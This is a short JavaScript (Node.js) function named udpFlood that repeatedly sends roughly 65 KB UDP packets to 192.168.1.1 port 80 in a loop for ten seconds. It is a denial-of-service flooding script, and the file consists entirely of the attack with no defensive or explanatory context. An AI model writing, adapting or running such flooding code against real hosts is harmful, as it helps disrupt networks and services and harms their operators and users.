
function udpFlood() {

  var HOST = "192.168.1.1";
  var port = "3000";
  var timeout = 10000;
  var dgram = require('dgram');
  var client = dgram.createSocket('udp4');

  var output = "";
  for (var i = 65000; i >= 0; i--) {
    output += "X";
  };

  var startTime = new Date();
  while (1) {

    if (timeout) {
      var nowTime = new Date();
      if (nowTime.getTime() >= (startTime.getTime() + timeout)) {
        break;
      }
    }

    var message = new Buffer(output);

    (function (PORT) {
      client.send(message, 0, message.length, "80", "192.168.1.1", function (err, bytes) {
        if (err) throw err;
        console.log('UDP message sent to ' + HOST + ':' + PORT);
      });
    })(port || Math.floor(Math.random() * (65553) + 1));
  };
}
